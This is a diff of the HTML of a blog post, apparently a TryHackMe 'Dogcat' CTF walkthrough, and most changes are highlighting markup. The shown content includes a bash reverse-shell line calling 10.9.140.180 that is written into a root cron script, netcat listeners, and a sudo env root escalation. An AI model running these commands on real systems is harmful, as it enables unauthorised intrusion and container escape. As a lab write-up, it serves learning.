-<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
-$ whoami
-www-data
-$ id
-<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
-$ ls -la
-total <span class="m">20</span>
-drwxr-xr-x <span class="m">1</span> root     root     <span class="m">4096</span> Mar <span class="m">10</span>  <span class="m">2020</span> .
-drwxr-xr-x <span class="m">1</span> root     root     <span class="m">4096</span> Feb <span class="m">26</span>  <span class="m">2020</span> ..
--rw-r--r-- <span class="m">1</span> root     root       <span class="m">23</span> Mar <span class="m">10</span>  <span class="m">2020</span> flag2_QMW7JvaY2LvK.txt
-drwxrwxrwx <span class="m">4</span> www-data www-data <span class="m">4096</span> Feb <span class="m">19</span> 15:50 html
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lnvp <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.9.140.180<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.19.192<span class="o">]</span> <span class="m">58382</span>
+</span></span><span class="line"><span class="cl">Linux 4ec6d4b7cd78 4.15.0-96-generic <span class="c1">#97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux</span>
+</span></span><span class="line"><span class="cl"> 15:55:29 up <span class="m">42</span> min,  <span class="m">0</span> users,  load average: 0.00, 0.02, 0.13
+</span></span><span class="line"><span class="cl">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span></span><span class="line"><span class="cl">$ whoami
+</span></span><span class="line"><span class="cl">www-data
+</span></span><span class="line"><span class="cl">$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">20</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root     root     <span class="m">4096</span> Mar <span class="m">10</span>  <span class="m">2020</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root     root     <span class="m">4096</span> Feb <span class="m">26</span>  <span class="m">2020</span> ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root     root       <span class="m">23</span> Mar <span class="m">10</span>  <span class="m">2020</span> flag2_QMW7JvaY2LvK.txt
+</span></span><span class="line"><span class="cl">drwxrwxrwx <span class="m">4</span> www-data www-data <span class="m">4096</span> Feb <span class="m">19</span> 15:50 html
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We successfully obtained a reverse shell and the second flag.</p>
 <hr />
@@ -2118,7 +2118,7 @@ drwxrwxrwx <span class="m">4</span> www-data www-data <span class="m">4096</span
 <p>Running <code>sudo -l</code> command we check our sudo permissions.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2126,19 +2126,19 @@ drwxrwxrwx <span class="m">4</span> www-data www-data <span class="m">4096</span
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo -l
-Matching Defaults entries <span class="k">for</span> www-data on 4ec6d4b7cd78:
-    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
-
-User www-data may run the following commands on 4ec6d4b7cd78:
-    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/env
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> www-data on 4ec6d4b7cd78:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User www-data may run the following commands on 4ec6d4b7cd78:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/env
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>From the above command output we see that we can run <a href="https://gtfobins.github.io/gtfobins/env/"><strong>env</strong></a> binary without a password as the <code>root</code> user.<br />
 We will use this fact to execute a shell as the <code>root</code> user and read the fourth flag.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2151,25 +2151,25 @@ We will use this fact to execute a shell as the <code>root</code> user and read 
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ sudo env /bin/sh
-whoami
-root
-<span class="nb">cd</span> /root  
-ls -la
-total <span class="m">20</span>
-drwx------ <span class="m">1</span> root root <span class="m">4096</span> Mar <span class="m">10</span>  <span class="m">2020</span> .
-drwxr-xr-x <span class="m">1</span> root root <span class="m">4096</span> Feb <span class="m">19</span> 15:15 ..
--rw-r--r-- <span class="m">1</span> root root  <span class="m">570</span> Jan <span class="m">31</span>  <span class="m">2010</span> .bashrc
--rw-r--r-- <span class="m">1</span> root root  <span class="m">148</span> Aug <span class="m">17</span>  <span class="m">2015</span> .profile
--r-------- <span class="m">1</span> root root   <span class="m">35</span> Mar <span class="m">10</span>  <span class="m">2020</span> flag3.txt
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo env /bin/sh
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /root  
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">20</span>
+</span></span><span class="line"><span class="cl">drwx------ <span class="m">1</span> root root <span class="m">4096</span> Mar <span class="m">10</span>  <span class="m">2020</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root root <span class="m">4096</span> Feb <span class="m">19</span> 15:15 ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">570</span> Jan <span class="m">31</span>  <span class="m">2010</span> .bashrc
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">148</span> Aug <span class="m">17</span>  <span class="m">2015</span> .profile
+</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> root root   <span class="m">35</span> Mar <span class="m">10</span>  <span class="m">2020</span> flag3.txt
+</span></span></code></pre></td></tr></table>
 </div>
 </div><hr />
 <h2 id="breaking-out-of-a-docker-container">Breaking Out of a Docker Container</h2>
 <p>While performing further enumeration because we are still missing the fourth flag, we found a shell script located in the <code>/opt/backups</code> directory.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2187,45 +2187,45 @@ drwxr-xr-x <span class="m">1</span> root root <span class="m">4096</span> Feb <s
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /opt
-ls -la
-total <span class="m">12</span>
-drwxr-xr-x <span class="m">1</span> root root <span class="m">4096</span> Feb <span class="m">19</span> 15:15 .
-drwxr-xr-x <span class="m">1</span> root root <span class="m">4096</span> Feb <span class="m">19</span> 15:15 ..
-drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Apr  <span class="m">8</span>  <span class="m">2020</span> backups
-<span class="nb">cd</span> backups
-ls -la
-total <span class="m">2892</span>
-drwxr-xr-x <span class="m">2</span> root root    <span class="m">4096</span> Apr  <span class="m">8</span>  <span class="m">2020</span> .
-drwxr-xr-x <span class="m">1</span> root root    <span class="m">4096</span> Feb <span class="m">19</span> 15:15 ..
--rwxr--r-- <span class="m">1</span> root root      <span class="m">69</span> Mar <span class="m">10</span>  <span class="m">2020</span> backup.sh
--rw-r--r-- <span class="m">1</span> root root <span class="m">2949120</span> Feb <span class="m">19</span> 16:01 backup.tar
-cat backup.sh
-<span class="c1">#!/bin/bash</span>
-tar cf /root/container/backup/backup.tar /root/container
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /opt
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">12</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root root <span class="m">4096</span> Feb <span class="m">19</span> 15:15 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root root <span class="m">4096</span> Feb <span class="m">19</span> 15:15 ..
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Apr  <span class="m">8</span>  <span class="m">2020</span> backups
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> backups
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">2892</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root    <span class="m">4096</span> Apr  <span class="m">8</span>  <span class="m">2020</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root root    <span class="m">4096</span> Feb <span class="m">19</span> 15:15 ..
+</span></span><span class="line"><span class="cl">-rwxr--r-- <span class="m">1</span> root root      <span class="m">69</span> Mar <span class="m">10</span>  <span class="m">2020</span> backup.sh
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">2949120</span> Feb <span class="m">19</span> 16:01 backup.tar
+</span></span><span class="line"><span class="cl">cat backup.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">tar cf /root/container/backup/backup.tar /root/container
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Based on the <strong>container</strong> directory, we can assume that we are inside a <strong>Docker</strong> container. This means that there is a further privilege escalation we want to utilize.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;#!/bin/bash&#34;</span> &gt; backup.sh
-<span class="nb">echo</span> <span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.9.140.180/1234 0&gt;&amp;1&#39;&#34;</span> &gt;&gt; backup.sh
-cat backup.sh
-<span class="c1">#!/bin/bash</span>
-/bin/bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.9.140.180/1234 0&gt;&amp;1&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;#!/bin/bash&#34;</span> &gt; backup.sh
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.9.140.180/1234 0&gt;&amp;1&#39;&#34;</span> &gt;&gt; backup.sh
+</span></span><span class="line"><span class="cl">cat backup.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">/bin/bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.9.140.180/1234 0&gt;&amp;1&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Rewriting the backup.sh script, which runs as a cron job, with our bash reverse shell and simultaneously starting a listener gives us a root shell out of the Docker container.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2255,35 +2255,35 @@ cat backup.sh
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nc -lnvp <span class="m">1234</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
-connect to <span class="o">[</span>10.9.140.180<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.19.192<span class="o">]</span> <span class="m">36340</span>
-bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>3972<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
-bash: no job control in this shell
-root@dogcat:~# ls -la
-ls -la
-total <span class="m">40</span>
-drwx------  <span class="m">6</span> root root <span class="m">4096</span> Apr  <span class="m">8</span>  <span class="m">2020</span> .
-drwxr-xr-x <span class="m">24</span> root root <span class="m">4096</span> Apr  <span class="m">8</span>  <span class="m">2020</span> ..
-lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">10</span>  <span class="m">2020</span> .bash_history -&gt; /dev/null
--rw-r--r--  <span class="m">1</span> root root <span class="m">3106</span> Apr  <span class="m">9</span>  <span class="m">2018</span> .bashrc
-drwx------  <span class="m">2</span> root root <span class="m">4096</span> Apr  <span class="m">8</span>  <span class="m">2020</span> .cache
-drwxr-xr-x  <span class="m">5</span> root root <span class="m">4096</span> Mar <span class="m">10</span>  <span class="m">2020</span> container
--rw-r--r--  <span class="m">1</span> root root   <span class="m">80</span> Mar <span class="m">10</span>  <span class="m">2020</span> flag4.txt
-drwx------  <span class="m">3</span> root root <span class="m">4096</span> Apr  <span class="m">8</span>  <span class="m">2020</span> .gnupg
-drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Apr  <span class="m">8</span>  <span class="m">2020</span> .local
--rw-r--r--  <span class="m">1</span> root root  <span class="m">148</span> Aug <span class="m">17</span>  <span class="m">2015</span> .profile
--rw-r--r--  <span class="m">1</span> root root   <span class="m">66</span> Mar <span class="m">10</span>  <span class="m">2020</span> .selected_editor
-root@dogcat:~# whoami 
-whoami
-root
-root@dogcat:~# id
-id
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-root@dogcat:~# wc flag4.txt      
-wc flag4.txt
- <span class="m">1</span>  <span class="m">1</span> <span class="m">80</span> flag4.txt
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lnvp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.9.140.180<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.19.192<span class="o">]</span> <span class="m">36340</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>3972<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">root@dogcat:~# ls -la
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">40</span>
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">6</span> root root <span class="m">4096</span> Apr  <span class="m">8</span>  <span class="m">2020</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">24</span> root root <span class="m">4096</span> Apr  <span class="m">8</span>  <span class="m">2020</span> ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">10</span>  <span class="m">2020</span> .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root <span class="m">3106</span> Apr  <span class="m">9</span>  <span class="m">2018</span> .bashrc
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> root root <span class="m">4096</span> Apr  <span class="m">8</span>  <span class="m">2020</span> .cache
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">5</span> root root <span class="m">4096</span> Mar <span class="m">10</span>  <span class="m">2020</span> container
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root   <span class="m">80</span> Mar <span class="m">10</span>  <span class="m">2020</span> flag4.txt
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">3</span> root root <span class="m">4096</span> Apr  <span class="m">8</span>  <span class="m">2020</span> .gnupg
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Apr  <span class="m">8</span>  <span class="m">2020</span> .local
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">148</span> Aug <span class="m">17</span>  <span class="m">2015</span> .profile
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root   <span class="m">66</span> Mar <span class="m">10</span>  <span class="m">2020</span> .selected_editor
+</span></span><span class="line"><span class="cl">root@dogcat:~# whoami 
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">root@dogcat:~# id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@dogcat:~# wc flag4.txt      
+</span></span><span class="line"><span class="cl">wc flag4.txt
+</span></span><span class="line"><span class="cl"> <span class="m">1</span>  <span class="m">1</span> <span class="m">80</span> flag4.txt
+</span></span></code></pre></td></tr></table>
 </div>
 </div></br>
 <p><em>Thank you for reading this blog post.</em></p>
@@ -2477,29 +2477,6 @@ wc flag4.txt
   
 </script>
     
-<div class="donation">
-  <div class="donation__message">
-    Share on
-  </div>
-  <div class="donation__icons">
-    
-    
-    
-      
-        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2fdogcat%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
-        </a>
-      
-    
-      
-        <a href="https://twitter.com/intent/tweet?text=Dogcat%20%5bTryHackMe%5d&url=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2fdogcat%2f&hashtags=enumeration%2clfi%2cdocker%2ccron%20job%2cprivilege%20escalation&via=" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
-        </a>
-      
-    
-  </div>
-</div>
-
 
     
     
@@ -2525,7 +2502,7 @@ wc flag4.txt
     </div>
     <div class="whoami__desc">
       
-        Computer Science student interested in Penetration Testing, Cyber Defense, OSINT and Social Engineering
+        Cyber Security Analyst | Master&#39;s student of Computer Science
       
     </div>
     <div class="whoami__social">
@@ -2712,7 +2689,7 @@ wc flag4.txt
 </div>
 
 
-<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>
+<script defer src="/js/swipe.min.9d61b979db5cc2a1ff3a5d410e881547a61b9d28bc23e811c49061d47df07ef3.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3727,7 +3704,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 
             <p class="caption">
                 
-                    ©2022, All Rights Reserved
+                    ©2023, All Rights Reserved
                 
             </p>
         
